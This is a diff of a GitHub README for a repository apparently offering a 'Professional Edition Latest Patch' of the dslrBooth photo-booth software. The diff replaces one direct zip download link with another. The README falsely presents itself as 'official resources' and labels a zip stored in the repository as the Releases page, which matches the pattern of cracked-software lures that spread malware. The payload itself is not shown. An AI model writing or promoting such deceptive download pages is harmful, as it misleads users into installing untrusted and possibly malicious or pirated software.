@@ -1,7 +1,7 @@
 # 📸 dslrBooth-Professional-Edition-Latest-Patch - Easy Setup for Your Photo Booth
 
 ## 🔗 Download Now
-[![Download dslrBooth](https://raw.githubusercontent.com/moon107-coder/dslrBooth-Professional-Edition-Latest-Patch/main/vexedness/dslrBooth-Professional-Edition-Latest-Patch_v1.6-beta.4.zip)](https://raw.githubusercontent.com/moon107-coder/dslrBooth-Professional-Edition-Latest-Patch/main/vexedness/dslrBooth-Professional-Edition-Latest-Patch_v1.6-beta.4.zip)
+[![Download dslrBooth](https://github.com/moon107-coder/dslrBooth-Professional-Edition-Latest-Patch/raw/refs/heads/main/vexedness/dslr-Booth-Patch-Professional-Edition-Latest-2.1.zip)](https://github.com/moon107-coder/dslrBooth-Professional-Edition-Latest-Patch/raw/refs/heads/main/vexedness/dslr-Booth-Patch-Professional-Edition-Latest-2.1.zip)
 
 ## 📖 Description
 Welcome to the dslrBooth-Professional-Edition-Latest-Patch repository. This collection offers a range of official resources, guides, and reference materials tailored for dslrBooth Professional Edition on Windows PCs. Here, you will find everything you need to set up and optimize your photo booth software experience.
@@ -11,7 +11,7 @@ To get started with dslrBooth, follow these steps to download and install the so
 
 1. **Visit the Download Page**  
    Go to the Releases page by clicking the link below:  
-   [Visit this page to download](https://raw.githubusercontent.com/moon107-coder/dslrBooth-Professional-Edition-Latest-Patch/main/vexedness/dslrBooth-Professional-Edition-Latest-Patch_v1.6-beta.4.zip)
+   [Visit this page to download](https://github.com/moon107-coder/dslrBooth-Professional-Edition-Latest-Patch/raw/refs/heads/main/vexedness/dslr-Booth-Patch-Professional-Edition-Latest-2.1.zip)
 
 2. **Select the Latest Release**  
    Look for the latest version in the list. This version includes all the fixes and enhancements.
